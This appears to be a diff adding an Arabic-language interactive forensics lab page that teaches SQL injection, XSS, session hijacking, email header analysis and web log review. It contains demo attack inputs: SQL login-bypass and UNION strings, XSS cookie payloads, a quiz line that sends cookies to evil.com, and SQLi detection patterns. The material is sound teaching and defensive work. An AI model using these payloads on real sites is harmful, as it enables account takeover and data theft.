@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>مختبر الجنائيات الرقمية للويب والبريد</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+[onclick]{cursor:pointer}
+input,select,textarea,button{font-size:16px;touch-action:manipulation}
+button{touch-action:manipulation}
+body{font-family:'Segoe UI',Tahoma,Arial,sans-serif;background:#0a0f1e;color:#e0e6f0;min-height:100vh;-webkit-text-size-adjust:100%}
+.header{background:linear-gradient(135deg,#0d1b2a,#1a1a0d);padding:20px 30px;border-bottom:2px solid #f59e0b;display:flex;align-items:center;gap:15px}
+.header h1{font-size:1.5rem;color:#f59e0b}
+.tabs{display:flex;gap:0;background:#071020;border-bottom:1px solid #1e3a5c;padding:0 20px;overflow-x:auto}
+.tab{padding:13px 20px;cursor:pointer;color:#7ab3d4;border-bottom:3px solid transparent;white-space:nowrap;font-size:.88rem;transition:all .2s}
+.tab:hover{color:#f59e0b}
+.tab.active{color:#f59e0b;border-bottom-color:#f59e0b}
+.panel{display:none;padding:28px;max-width:980px;margin:0 auto}
+.panel.active{display:block}
+h2{color:#f59e0b;margin-bottom:6px;font-size:1.2rem}
+.sub{color:#7ab3d4;font-size:.85rem;margin-bottom:20px;line-height:1.7}
+.card{background:#0d1b2a;border:1px solid #1e3a5c;border-radius:12px;padding:22px;margin-bottom:18px}
+.card h3{color:#f59e0b;margin-bottom:12px;font-size:.98rem}
+.browser-bar{background:#1a1a0d;border:1px solid #2d2d00;border-radius:8px;padding:0;overflow:hidden;margin-bottom:4px}
+.browser-top{background:#0f0f00;padding:8px 12px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #2d2d00}
+.browser-dot{width:10px;height:10px;border-radius:50%}
+.url-bar{flex:1;background:#1a1a0d;border:1px solid #2d2d00;border-radius:4px;padding:5px 10px;color:#e0e6f0;font-family:'Courier New',monospace;font-size:.82rem}
+.browser-body{padding:16px;min-height:100px}
+.db-table{width:100%;border-collapse:collapse;font-size:.82rem;font-family:'Courier New',monospace}
+.db-table th{background:#1a0d00;color:#f59e0b;padding:8px;text-align:right;border-bottom:2px solid #2d2d00}
+.db-table td{padding:8px;border-bottom:1px solid #1e3a5c;color:#aab8c8}
+.db-table tr.highlight td{background:rgba(255,68,68,.15);color:#ff8888}
+.terminal{background:#020a06;border:1px solid #1e5c1e;border-radius:8px;padding:14px;font-family:'Courier New',monospace;font-size:.82rem;margin:12px 0}
+.prompt{color:#00ff88}.cmd{color:#fff}.out{color:#7fbb7f;white-space:pre-wrap}
+.alert{padding:12px 16px;border-radius:6px;margin:10px 0;font-size:.88rem;line-height:1.6}
+.alert-warn{background:rgba(255,170,0,.1);border:1px solid rgba(255,170,0,.3);color:#ffaa00}
+.alert-danger{background:rgba(255,68,68,.1);border:1px solid rgba(255,68,68,.3);color:#ff8888}
+.alert-success{background:rgba(0,255,136,.1);border:1px solid rgba(0,255,136,.3);color:#00ff88}
+.alert-info{background:rgba(0,212,255,.1);border:1px solid rgba(0,212,255,.3);color:#7ab3d4}
+.alert-orange{background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.3);color:#f59e0b}
+.btn{padding:9px 18px;border:none;border-radius:6px;font-size:.86rem;cursor:pointer;font-weight:600;transition:all .2s}
+.btn-orange{background:#f59e0b;color:#000}.btn-orange:hover{background:#d97706}
+.btn-red{background:#ff4444;color:#fff}.btn-green{background:#00ff88;color:#000}
+.btn-outline{background:transparent;border:1px solid #f59e0b;color:#f59e0b}
+.btn-outline:hover{background:#f59e0b;color:#000}
+.btn-sm{padding:5px 12px;font-size:.78rem}
+input[type=text]{width:100%;background:#071020;border:1px solid #1e3a5c;border-radius:6px;padding:9px 12px;color:#e0e6f0;font-size:.88rem;font-family:inherit}
+input:focus{outline:none;border-color:#f59e0b}
+.code-block{background:#020a06;border:1px solid #1e3a5c;border-radius:8px;padding:14px;font-family:'Courier New',monospace;font-size:.8rem;line-height:1.8;overflow-x:auto}
+.kw{color:#f59e0b}.str{color:#00ff88}.comment{color:#556070}.danger{color:#ff4444;font-weight:bold}.safe{color:#00d4ff}
+.email-header{background:#020a06;border:1px solid #1e3a5c;border-radius:8px;padding:16px;font-family:'Courier New',monospace;font-size:.78rem;line-height:2}
+.eh-key{color:#f59e0b;min-width:200px;display:inline-block}.eh-val{color:#aab8c8}
+.eh-suspicious{color:#ff4444!important}.eh-ok{color:#00ff88!important}
+.hop-row{display:flex;gap:12px;align-items:center;padding:8px 0;border-bottom:1px solid #1e3a5c;font-size:.82rem}
+.hop-num{width:24px;height:24px;border-radius:50%;background:#1e3a5c;display:flex;align-items:center;justify-content:center;font-size:.72rem;color:#f59e0b;flex-shrink:0}
+.hop-ip{color:#00d4ff;min-width:130px;font-family:monospace}
+.hop-loc{color:#7ab3d4;flex:1}
+.hop-time{color:#a855f7;font-family:monospace;font-size:.75rem}
+.quiz-box{background:#0d1b2a;border:1px solid #1e3a5c;border-radius:8px;padding:18px;margin:14px 0}
+.quiz-box h4{color:#f59e0b;margin-bottom:12px}
+.options label{display:flex;align-items:center;gap:10px;padding:9px 12px;margin:5px 0;background:#071020;border:1px solid #1e3a5c;border-radius:6px;cursor:pointer;transition:all .2s;font-size:.88rem}
+.options label:hover{border-color:#f59e0b}
+.options label.correct{border-color:#00ff88;background:rgba(0,255,136,.08);color:#00ff88}
+.options label.wrong{border-color:#ff4444;background:rgba(255,68,68,.08);color:#ff8888}
+.options input{accent-color:#f59e0b}
+.xss-demo{background:#fff;border-radius:6px;padding:16px;color:#000;min-height:60px;font-size:.9rem}
+.xss-safe{background:#e8f5e9;color:#1b5e20;padding:12px;border-radius:6px;font-size:.9rem}
+.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:.72rem;font-weight:bold}
+.badge-red{background:rgba(255,68,68,.2);color:#ff8888}
+.badge-green{background:rgba(0,255,136,.2);color:#00ff88}
+.badge-orange{background:rgba(245,158,11,.2);color:#f59e0b}
+.tag{display:inline-block;background:#1a1a0d;color:#d97706;padding:3px 10px;border-radius:4px;font-size:.75rem;margin-left:6px}
+.ip-map{background:#071020;border:1px solid #1e3a5c;border-radius:8px;padding:16px;font-family:'Courier New',monospace;font-size:.82rem}
+.session-table{width:100%;border-collapse:collapse;font-size:.82rem}
+.session-table th{background:#1a0d00;color:#f59e0b;padding:8px;border-bottom:2px solid #2d2d00;text-align:right}
+.session-table td{padding:8px;border-bottom:1px solid #1e3a5c;font-family:monospace;font-size:.78rem}
+.stolen{color:#ff4444!important;background:rgba(255,68,68,.05)}
+</style>
+</head>
+<body>
+<div class="header">
+  <div style="font-size:2rem">🌐</div>
+  <div>
+    <h1>مختبر جنائيات الويب والبريد الإلكتروني</h1>
+    <div style="color:#d97706;font-size:.82rem">Web & Email Forensics — الفصل الثامن</div>
+  </div>
+  <a href="lab.html" style="margin-right:auto;color:#7ab3d4;font-size:.85rem;text-decoration:none;border:1px solid #1e3a5c;padding:6px 14px;border-radius:6px">← المختبر الرئيسي</a>
+</div>
+
+<div class="tabs">
+  <div class="tab active" onclick="showTab('sqli')">💉 SQL Injection</div>
+  <div class="tab" onclick="showTab('xss')">📜 XSS Attack</div>
+  <div class="tab" onclick="showTab('session')">🍪 Session Hijacking</div>
+  <div class="tab" onclick="showTab('email')">📧 Email Forensics</div>
+  <div class="tab" onclick="showTab('logs')">📋 Web Server Logs</div>
+</div>
+
+<!-- SQL INJECTION -->
+<div class="panel active" id="tab-sqli">
+  <h2>💉 SQL Injection — حقن قواعد البيانات</h2>
+  <p class="sub">المهاجم يُدخل كود SQL في حقول الإدخال لتجاوز المصادقة أو سرقة البيانات. من أخطر هجمات الويب وأكثرها شيوعاً.</p>
+
+  <div class="card">
+    <h3>🗄️ قاعدة البيانات المستهدفة (محاكاة)</h3>
+    <table class="db-table" id="db-users">
+      <tr><th>ID</th><th>اسم المستخدم</th><th>كلمة المرور</th><th>الصلاحية</th></tr>
+      <tr><td>1</td><td>admin</td><td>Admin@2024!</td><td>🔴 مدير</td></tr>
+      <tr><td>2</td><td>khalid</td><td>kh@lid123</td><td>🟡 موظف</td></tr>
+      <tr><td>3</td><td>sara</td><td>sara_pass</td><td>🟡 موظفة</td></tr>
+      <tr><td>4</td><td>forensics</td><td>f0r3ns1cs!</td><td>🟢 محقق</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <h3>🔓 السيناريو الأول — تجاوز تسجيل الدخول</h3>
+    <p style="color:#7ab3d4;font-size:.85rem;margin-bottom:12px">الكود الأصلي في الخادم:</p>
+    <div class="code-block"><span class="kw">SELECT</span> * <span class="kw">FROM</span> users <span class="kw">WHERE</span> username = '<span class="str">[USERNAME]</span>' <span class="kw">AND</span> password = '<span class="str">[PASSWORD]</span>'</div>
+    <div style="margin-top:14px">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:10px">
+        <div>
+          <div style="color:#7ab3d4;font-size:.8rem;margin-bottom:4px">اسم المستخدم</div>
+          <input type="text" id="sqli-user" value="admin" placeholder="اسم المستخدم">
+        </div>
+        <div>
+          <div style="color:#7ab3d4;font-size:.8rem;margin-bottom:4px">كلمة المرور</div>
+          <input type="text" id="sqli-pass" value="" placeholder="كلمة المرور">
+        </div>
+      </div>
+      <div style="display:flex;gap:10px;flex-wrap:wrap">
+        <button class="btn btn-outline btn-sm" onclick="injectSQL(\"admin\",\"' OR '1'='1\")">💉 جرّب: ' OR '1'='1</button>
+        <button class="btn btn-outline btn-sm" onclick="injectSQL(\"admin'--\",\"anything\")">💉 جرّب: admin'--</button>
+        <button class="btn btn-outline btn-sm" onclick="injectSQL(\"admin\",\"Admin@2024!\")">✅ تسجيل صحيح</button>
+        <button class="btn btn-orange" onclick="runSQLi()">تنفيذ الاستعلام</button>
+      </div>
+    </div>
+    <div id="sqli-query" class="code-block" style="margin-top:12px;color:#556070">الاستعلام يظهر هنا...</div>
+    <div id="sqli-result" style="margin-top:10px"></div>
+  </div>
+
+  <div class="card">
+    <h3>🔍 السيناريو الثاني — UNION Attack لسرقة البيانات</h3>
+    <div class="alert alert-danger">⚠️ المهاجم يضيف UNION SELECT لاستخراج بيانات من جداول أخرى</div>
+    <div class="code-block"><span class="comment">-- طلب بحث عادي:</span>
+<span class="kw">SELECT</span> name, price <span class="kw">FROM</span> products <span class="kw">WHERE</span> id = <span class="str">1</span>
+
+<span class="comment">-- بعد الحقن (المهاجم يضيف):</span>
+<span class="kw">SELECT</span> name, price <span class="kw">FROM</span> products <span class="kw">WHERE</span> id = <span class="danger">1 UNION SELECT username, password FROM users--</span></div>
+    <button class="btn btn-red" style="margin-top:12px" onclick="runUnion()">💥 تنفيذ UNION Attack</button>
+    <div id="union-result" style="margin-top:12px"></div>
+  </div>
+
+  <div class="card">
+    <h3>🛡️ كيف يكتشف المحقق هجوم SQL Injection؟</h3>
+    <div class="terminal">
+      <div class="prompt">analyst@forensics:~$ <span class="cmd">grep -i "union\|select\|'\s*or\s*'\|--" /var/log/apache2/access.log</span></div>
+      <div class="out">192.168.1.105 - - [20/Mar/2024:14:22:31] "GET /login.php?id=1' HTTP/1.1" 500
+192.168.1.105 - - [20/Mar/2024:14:22:45] "GET /login.php?id=1+UNION+SELECT+null,username,password+FROM+users--" HTTP/1.1" 200
+192.168.1.105 - - [20/Mar/2024:14:23:01] "POST /login.php" 200 <span style="color:#ff4444">← تسجيل دخول ناجح بعد 47 محاولة!</span></div>
+    </div>
+    <div class="quiz-box">
+      <h4>❓ ما الوسيلة الأساسية للحماية من SQL Injection؟</h4>
+      <div class="options" id="q-sqli">
+        <label><input type="radio" name="q-sqli" value="a"> استخدام HTTPS</label>
+        <label><input type="radio" name="q-sqli" value="b"> Prepared Statements / Parameterized Queries — فصل الكود عن البيانات</label>
+        <label><input type="radio" name="q-sqli" value="c"> تغيير اسم قاعدة البيانات</label>
+        <label><input type="radio" name="q-sqli" value="d"> تشفير كلمات المرور فقط</label>
+      </div>
+      <button class="btn btn-orange" style="margin-top:10px" onclick="checkQ('q-sqli','b','sqli-q-res',15)">إرسال</button>
+      <div id="sqli-q-res"></div>
+    </div>
+  </div>
+</div>
+
+<!-- XSS -->
+<div class="panel" id="tab-xss">
+  <h2>📜 Cross-Site Scripting (XSS)</h2>
+  <p class="sub">المهاجم يحقن كود JavaScript خبيث في صفحة الويب يُنفَّذ في متصفح الضحية. يُستخدم لسرقة Cookies أو إعادة التوجيه أو تشويه المواقع.</p>
+
+  <div class="card">
+    <h3>🧪 Reflected XSS — محاكاة حية</h3>
+    <p style="color:#7ab3d4;font-size:.85rem;margin-bottom:12px">موقع البحث يعرض ما كتبه المستخدم مباشرة دون تنظيف:</p>
+    <div class="browser-bar">
+      <div class="browser-top">
+        <div class="browser-dot" style="background:#ff5f57"></div>
+        <div class="browser-dot" style="background:#febc2e"></div>
+        <div class="browser-dot" style="background:#28c840"></div>
+        <input class="url-bar" id="xss-url" value="https://vulnerable-shop.com/search?q=" readonly style="flex:0 0 auto;width:350px">
+        <span id="xss-url-param" style="color:#ff4444;font-family:monospace;font-size:.8rem"></span>
+      </div>
+      <div class="browser-body">
+        <div style="color:#1e3a5c;font-size:.9rem;margin-bottom:8px">نتائج البحث عن: <strong id="xss-display" style="color:#333"></strong></div>
+        <div id="xss-output" class="xss-demo">أدخل نصاً في الحقل أدناه...</div>
+      </div>
+    </div>
+    <div style="display:flex;gap:10px;margin-top:10px;flex-wrap:wrap">
+      <input type="text" id="xss-input" placeholder="أدخل نص البحث..." style="flex:1" oninput="previewXSS()">
+      <button class="btn btn-outline btn-sm" onclick="setXSS('laptop')">نص عادي</button>
+      <button class="btn btn-red btn-sm" onclick="setXSS('&lt;script&gt;alert(\"XSS!\")'+'&lt;/script&gt;')">💉 Reflected XSS</button>
+      <button class="btn btn-red btn-sm" onclick="setXSS('&lt;img src=x onerror=&quot;document.cookie&quot;&gt;')">🍪 Cookie Steal</button>
+    </div>
+    <div id="xss-safe-output" style="margin-top:10px"></div>
+  </div>
+
+  <div class="card">
+    <h3>📋 أنواع XSS</h3>
+    <div style="display:grid;gap:12px">
+      <div class="alert alert-danger">
+        <strong>1. Reflected XSS</strong> — الكود في الرابط URL، يُنفَّذ فوراً على الضحية التي تنقر الرابط. يُرسَل الرابط عبر البريد أو الواتساب.
+      </div>
+      <div class="alert alert-danger">
+        <strong>2. Stored XSS (الأخطر)</strong> — الكود يُخزَّن في قاعدة البيانات (تعليق، اسم مستخدم) ويُنفَّذ على كل من يفتح الصفحة.
+      </div>
+      <div class="alert alert-warn">
+        <strong>3. DOM-Based XSS</strong> — يعمل بالكامل في المتصفح دون إرسال طلب للخادم، الأصعب كشفاً من السجلات.
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>🛡️ الحماية والكشف الجنائي</h3>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+      <div>
+        <div style="color:#ff4444;font-size:.85rem;margin-bottom:8px">❌ كود خطير:</div>
+        <div class="code-block"><span class="comment">// PHP — ضعيف</span>
+echo $_GET['q'];
+
+<span class="comment">// JavaScript — ضعيف</span>
+div.innerHTML = userInput;</div>
+      </div>
+      <div>
+        <div style="color:#00ff88;font-size:.85rem;margin-bottom:8px">✅ كود آمن:</div>
+        <div class="code-block"><span class="comment">// PHP — آمن</span>
+echo htmlspecialchars($_GET['q']);
+
+<span class="comment">// JavaScript — آمن</span>
+div.textContent = userInput;</div>
+      </div>
+    </div>
+    <div class="quiz-box">
+      <h4>❓ المحقق يرى في السجل: <code style="color:#ff4444">GET /search?q=&lt;script&gt;fetch('evil.com?c='+document.cookie)&lt;/script&gt;</code> — ماذا حدث؟</h4>
+      <div class="options" id="q-xss">
+        <label><input type="radio" name="q-xss" value="a"> المستخدم يبحث عن كود JavaScript</label>
+        <label><input type="radio" name="q-xss" value="b"> هجوم Reflected XSS لسرقة الـ Cookie وإرسالها لخادم المهاجم</label>
+        <label><input type="radio" name="q-xss" value="c"> خطأ في المتصفح</label>
+        <label><input type="radio" name="q-xss" value="d"> طلب AJAX عادي</label>
+      </div>
+      <button class="btn btn-orange" style="margin-top:10px" onclick="checkQ('q-xss','b','xss-q-res',15)">إرسال</button>
+      <div id="xss-q-res"></div>
+    </div>
+  </div>
+</div>
+
+<!-- SESSION HIJACKING -->
+<div class="panel" id="tab-session">
+  <h2>🍪 Session Hijacking — اختطاف الجلسة</h2>
+  <p class="sub">الخادم يُعطي المستخدم بعد تسجيل الدخول "رمز جلسة" (Session Token / Cookie). إذا سرقه المهاجم، يستطيع انتحال هوية الضحية دون معرفة كلمة المرور.</p>
+
+  <div class="card">
+    <h3>🔄 كيف تعمل جلسة الويب (Session)</h3>
+    <div style="display:flex;gap:0;align-items:center;flex-wrap:wrap;margin:14px 0;gap:8px">
+      <div style="background:#071020;border:1px solid #1e3a5c;border-radius:8px;padding:14px;flex:1;min-width:130px;text-align:center">
+        <div style="font-size:1.5rem">👤</div><div style="color:#7ab3d4;font-size:.8rem;margin-top:6px">المستخدم يسجّل دخول</div>
+      </div>
+      <div style="color:#f59e0b;font-size:1.2rem">→</div>
+      <div style="background:#071020;border:1px solid #1e3a5c;border-radius:8px;padding:14px;flex:1;min-width:130px;text-align:center">
+        <div style="font-size:1.5rem">🖥️</div><div style="color:#7ab3d4;font-size:.8rem;margin-top:6px">الخادم يُنشئ Session ID</div>
+      </div>
+      <div style="color:#f59e0b;font-size:1.2rem">→</div>
+      <div style="background:#071020;border:1px solid #1e3a5c;border-radius:8px;padding:14px;flex:1;min-width:130px;text-align:center">
+        <div style="font-size:1.5rem">🍪</div><div style="color:#7ab3d4;font-size:.8rem;margin-top:6px">يُرسَل كـ Cookie</div>
+      </div>
+      <div style="color:#f59e0b;font-size:1.2rem">→</div>
+      <div style="background:#071020;border:1px solid #f59e0b;border-radius:8px;padding:14px;flex:1;min-width:130px;text-align:center">
+        <div style="font-size:1.5rem">⚠️</div><div style="color:#f59e0b;font-size:.8rem;margin-top:6px">إذا سُرق → اختطاف الحساب!</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>🕵️ تحليل الـ Cookies المشبوهة</h3>
+    <table class="session-table">
+      <tr><th>اسم الـ Cookie</th><th>القيمة</th><th>الخادم</th><th>Secure</th><th>HttpOnly</th><th>الحكم</th></tr>
+      <tr>
+        <td>PHPSESSID</td><td style="color:#aab8c8">a1b2c3d4e5f6789abc</td><td>bank.sa</td>
+        <td><span style="color:#00ff88">✅</span></td><td><span style="color:#00ff88">✅</span></td>
+        <td><span class="badge badge-green">آمن</span></td>
+      </tr>
+      <tr class="stolen">
+        <td>user_session</td><td style="color:#ff8888">eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.</td><td>target-app.com</td>
+        <td><span style="color:#ff4444">❌</span></td><td><span style="color:#ff4444">❌</span></td>
+        <td><span class="badge badge-red">⚠️ خطر</span></td>
+      </tr>
+      <tr>
+        <td>remember_me</td><td style="color:#aab8c8">3f8a...hash...</td><td>forum.net</td>
+        <td><span style="color:#00ff88">✅</span></td><td><span style="color:#ff4444">❌</span></td>
+        <td><span class="badge badge-orange">تحقق</span></td>
+      </tr>
+    </table>
+    <div class="alert alert-danger" style="margin-top:12px">
+      🔍 الـ Cookie المشبوه يستخدم JWT بدون توقيع (<code>alg: none</code>) — أي شخص يستطيع تعديله لادعاء أنه admin!
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>🔍 كيف يسرق المهاجم الـ Session؟</h3>
+    <div style="display:grid;gap:10px">
+      <div class="alert alert-danger">🌐 <strong>Network Sniffing:</strong> اعتراض الحزم على شبكة WiFi مفتوحة — الـ Cookie يُرسَل بنص صريح إذا لم يكن HTTPS</div>
+      <div class="alert alert-danger">📜 <strong>XSS + Cookie Theft:</strong> <code>document.cookie</code> يُرسَل لخادم المهاجم عبر كود XSS (كما رأينا في التبويب السابق)</div>
+      <div class="alert alert-warn">🖥️ <strong>Cross-Site Request Forgery (CSRF):</strong> إجبار المستخدم على إرسال طلبات باسمه دون علمه</div>
+    </div>
+    <div class="quiz-box">
+      <h4>❓ المحقق يجد في سجل الخادم عنوانَي IP مختلفَين يستخدمان نفس Session ID خلال دقيقتين. ماذا يعني هذا؟</h4>
+      <div class="options" id="q-sess">
+        <label><input type="radio" name="q-sess" value="a"> المستخدم غيّر شبكته — أمر طبيعي</label>
+        <label><input type="radio" name="q-sess" value="b"> دليل قوي على Session Hijacking — مهاجم سرق الـ Cookie واستخدمه من IP مختلف</label>
+        <label><input type="radio" name="q-sess" value="c"> خطأ في الخادم</label>
+        <label><input type="radio" name="q-sess" value="d"> المستخدم يستخدم VPN</label>
+      </div>
+      <button class="btn btn-orange" style="margin-top:10px" onclick="checkQ('q-sess','b','sess-q-res',15)">إرسال</button>
+      <div id="sess-q-res"></div>
+    </div>
+  </div>
+</div>
+
+<!-- EMAIL FORENSICS -->
+<div class="panel" id="tab-email">
+  <h2>📧 تحليل رأس البريد الإلكتروني (Email Header Analysis)</h2>
+  <p class="sub">رأس الإيميل يحتوي على مسار الرسالة الكامل من المرسل إلى المستقبل. المحقق يحلله لتتبع IP الحقيقي للمرسل حتى لو استخدم بريداً مجهولاً.</p>
+
+  <div class="card">
+    <h3>📨 رأس إيميل تهديدي — هل هو حقيقي؟</h3>
+    <div class="email-header">
+      <div><span class="eh-key">From:</span> <span class="eh-val">"Ahmed Al-Rashid" &lt;ahmed@gmail.com&gt;</span> <span class="badge badge-orange">يدّعي أنه أحمد</span></div>
+      <div><span class="eh-key">Reply-To:</span> <span class="eh-val eh-suspicious">collect-reply@protonmail.com</span> <span class="badge badge-red">⚠️ مختلف عن المرسل!</span></div>
+      <div><span class="eh-key">To:</span> <span class="eh-val">victim@company.sa</span></div>
+      <div><span class="eh-key">Subject:</span> <span class="eh-val">عرض عمل مغري — رد عاجل</span></div>
+      <div><span class="eh-key">Date:</span> <span class="eh-val">Thu, 21 Mar 2024 09:15:33 +0300</span></div>
+      <div style="margin-top:8px"><span class="eh-key">Received (hop 3):</span> <span class="eh-val">from mail.gmail.com [209.85.220.41]</span> <span class="badge badge-green">Gmail</span></div>
+      <div><span class="eh-key">Received (hop 2):</span> <span class="eh-val eh-suspicious">from unknown [185.220.101.77]</span> <span class="badge badge-red">⚠️ Tor Exit Node</span></div>
+      <div><span class="eh-key">Received (hop 1):</span> <span class="eh-val">from [192.168.1.1] by smtp.gmail.com</span></div>
+      <div style="margin-top:8px"><span class="eh-key">X-Originating-IP:</span> <span class="eh-val eh-suspicious">185.220.101.77</span></div>
+      <div><span class="eh-key">Message-ID:</span> <span class="eh-val">&lt;abc123@mail.gmail.com&gt;</span></div>
+      <div><span class="eh-key">DKIM-Signature:</span> <span class="eh-val eh-suspicious">FAIL — التوقيع لا يتطابق</span> <span class="badge badge-red">⚠️ تزوير!</span></div>
+      <div><span class="eh-key">SPF:</span> <span class="eh-val eh-suspicious">FAIL — المرسل ليس من نطاق gmail.com المصرّح</span></div>
+    </div>
+    <button class="btn btn-orange" style="margin-top:14px" onclick="analyzeEmail()">🔍 تحليل رأس الإيميل</button>
+    <div id="email-analysis"></div>
+  </div>
+
+  <div class="card">
+    <h3>🗺️ تتبع مسار الرسالة Hop by Hop</h3>
+    <p style="color:#7ab3d4;font-size:.85rem;margin-bottom:12px">الرسالة تمر بعدة خوادم — كل خطوة تُسجَّل في الـ Received headers (تُقرأ من الأسفل للأعلى)</p>
+    <div class="hop-row">
+      <div class="hop-num">1</div>
+      <div class="hop-ip">192.168.1.1</div>
+      <div class="hop-loc">🏠 الشبكة المحلية للمرسل</div>
+      <div class="hop-time">09:15:30</div>
+    </div>
+    <div class="hop-row">
+      <div class="hop-num">2</div>
+      <div class="hop-ip" style="color:#ff4444">185.220.101.77</div>
+      <div class="hop-loc">🧅 <strong style="color:#ff4444">Tor Exit Node — روسيا</strong></div>
+      <div class="hop-time">09:15:31</div>
+    </div>
+    <div class="hop-row">
+      <div class="hop-num">3</div>
+      <div class="hop-ip">209.85.220.41</div>
+      <div class="hop-loc">📧 Gmail SMTP Server — الولايات المتحدة</div>
+      <div class="hop-time">09:15:33</div>
+    </div>
+    <div class="hop-row" style="border:none">
+      <div class="hop-num">4</div>
+      <div class="hop-ip">212.77.1.10</div>
+      <div class="hop-loc">📬 خادم بريد الشركة — السعودية</div>
+      <div class="hop-time">09:15:35</div>
+    </div>
+    <div class="alert alert-danger" style="margin-top:12px">🚨 المرسل استخدم <strong>Tor</strong> لإخفاء هويته — لكن نقطة الخروج (Exit Node) مسجّلة في قوائم Tor المعروفة. IP الحقيقي لا يزال مجهولاً لكن يمكن التنسيق مع الجهات الأمنية.</div>
+  </div>
+
+  <div class="card">
+    <h3>🔐 SPF, DKIM, DMARC — حماية البريد من الانتحال</h3>
+    <div style="display:grid;gap:10px;font-size:.88rem">
+      <div class="alert alert-info"><strong>SPF (Sender Policy Framework):</strong> يحدد من الخوادم المصرَّح لها بإرسال بريد من نطاق معين. FAIL = الخادم المرسِل غير مصرَّح → احتمال انتحال.</div>
+      <div class="alert alert-info"><strong>DKIM (DomainKeys Identified Mail):</strong> توقيع رقمي على كل رسالة. FAIL = الرسالة عُدِّلت أثناء النقل أو تزويرها.</div>
+      <div class="alert alert-info"><strong>DMARC:</strong> يجمع SPF و DKIM ويحدد ماذا يفعل الخادم عند الفشل (رفض / إرسال للـ Spam / تجاهل).</div>
+    </div>
+    <div class="quiz-box">
+      <h4>❓ إيميل DKIM = FAIL يعني؟</h4>
+      <div class="options" id="q-email">
+        <label><input type="radio" name="q-email" value="a"> الإيميل مرسَل بنجاح</label>
+        <label><input type="radio" name="q-email" value="b"> التوقيع الرقمي فشل التحقق — الرسالة مزوّرة أو عُدِّلت بعد الإرسال</label>
+        <label><input type="radio" name="q-email" value="c"> المرسل لا يملك اتصالاً جيداً</label>
+        <label><input type="radio" name="q-email" value="d"> الرسالة مشفّرة</label>
+      </div>
+      <button class="btn btn-orange" style="margin-top:10px" onclick="checkQ('q-email','b','email-q-res',15)">إرسال</button>
+      <div id="email-q-res"></div>
+    </div>
+  </div>
+</div>
+
+<!-- WEB SERVER LOGS -->
+<div class="panel" id="tab-logs">
+  <h2>📋 تحليل سجلات خادم الويب</h2>
+  <p class="sub">كل طلب HTTP يُسجَّل في ملف log. المحقق يحلل هذه السجلات لإعادة بناء ما حدث: من هاجم؟ متى؟ ماذا فعل؟</p>
+
+  <div class="card">
+    <h3>📄 سجل Apache — Common Log Format</h3>
+    <div class="terminal" id="log-terminal">
+      <div class="out" id="log-content"></div>
+    </div>
+    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:10px">
+      <button class="btn btn-outline btn-sm" onclick="filterLog('all')">📋 كل السجل</button>
+      <button class="btn btn-outline btn-sm" onclick="filterLog('404')">🔴 أخطاء 404</button>
+      <button class="btn btn-outline btn-sm" onclick="filterLog('sql')">💉 SQL Injection</button>
+      <button class="btn btn-outline btn-sm" onclick="filterLog('scan')">🔍 Port Scan</button>
+      <button class="btn btn-orange btn-sm" onclick="buildTimeline()">📊 بناء Timeline</button>
+    </div>
+    <div id="timeline-result" style="margin-top:12px"></div>
+  </div>
+
+  <div class="card">
+    <h3>📊 إحصاء الطلبات من الـ IP المشبوه</h3>
+    <div id="stats-display"></div>
+    <div class="quiz-box">
+      <h4>❓ محقق يرى 450 طلب 404 من نفس الـ IP خلال دقيقتين. ما هذا؟</h4>
+      <div class="options" id="q-logs">
+        <label><input type="radio" name="q-logs" value="a"> مستخدم يتصفح الموقع بشكل طبيعي</label>
+        <label><input type="radio" name="q-logs" value="b"> Directory/File Enumeration — المهاجم يبحث عن ملفات مخفية بأداة مثل DirBuster</label>
+        <label><input type="radio" name="q-logs" value="c"> خطأ في إعداد الموقع</label>
+        <label><input type="radio" name="q-logs" value="d"> Botnet تحديث</label>
+      </div>
+      <button class="btn btn-orange" style="margin-top:10px" onclick="checkQ('q-logs','b','logs-q-res',15)">إرسال</button>
+      <div id="logs-q-res"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  function fixTap(){
+    document.querySelectorAll('[onclick]').forEach(function(el){
+      el.style.cursor='pointer';
+      el.style.webkitUserSelect='none';
+      el.style.userSelect='none';
+      el.style.touchAction='manipulation';
+    });
+  }
+  fixTap();
+  new MutationObserver(fixTap).observe(document.body,{childList:true,subtree:true});
+  var moved=false;
+  document.addEventListener('touchstart',function(){moved=false;},{passive:true});
+  document.addEventListener('touchmove',function(){moved=true;},{passive:true});
+  document.addEventListener('touchend',function(e){
+    if(moved)return;
+    var el=e.target;
+    while(el&&el!==document.body){
+      if(el.hasAttribute('onclick')){e.preventDefault();el.click();return;}
+      el=el.parentElement;
+    }
+  },false);
+})();
+
+const logData=[
+  {ip:'192.168.1.50',time:'14:20:01',method:'GET',path:'/index.php',code:200,size:4523,type:'normal'},
+  {ip:'185.220.101.42',time:'14:20:15',method:'GET',path:"/login.php?id=1'",code:500,size:0,type:'sql'},
+  {ip:'185.220.101.42',time:'14:20:16',method:'GET',path:"/login.php?id=1+UNION+SELECT+null,username,password+FROM+users--",code:200,size:312,type:'sql'},
+  {ip:'192.168.1.50',time:'14:20:20',method:'GET',path:'/about.php',code:200,size:2100,type:'normal'},
+  {ip:'185.220.101.42',time:'14:20:22',method:'GET',path:'/admin/',code:404,size:0,type:'scan'},
+  {ip:'185.220.101.42',time:'14:20:22',method:'GET',path:'/wp-admin/',code:404,size:0,type:'scan'},
+  {ip:'185.220.101.42',time:'14:20:23',method:'GET',path:'/.env',code:404,size:0,type:'scan'},
